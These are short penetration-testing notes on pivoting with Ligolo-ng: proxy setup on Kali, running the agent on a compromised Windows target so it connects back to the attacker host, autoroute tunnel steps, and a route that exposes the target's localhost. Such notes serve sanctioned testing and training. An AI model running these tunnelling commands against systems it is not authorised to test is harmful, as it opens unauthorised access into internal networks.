# Pivoting

## Ligolo-ng
- If the host is dual-homed, we can setup a pivot using Ligolo-ng
- Setup ligilo-proxy on Kali: `sudo ligolo-proxy -selfcert`
- Download agent from releases: https://github.com/nicocha30/ligolo-ng
- Running agent on target: `.\agent.exe -connect 192.168.x.x:11601 -ignore-cert`
- Start tunnel on Kali:
  - `session`
  - Specify a session: `1`
  - `autoroute`
  - Select routes to add
  - Create a new interface
  - Enter interface name: `ligolo`
  - Start the tunnel? `y`
 
### Setting up a route for localhost to be remotely accessed
- After setting up the pivot, run the following command on Kali: `sudo ip route add 240.0.0.1/32 dev ligolo`
- Now, using `240.0.0.1` is like using `127.0.0.1` locally on the target
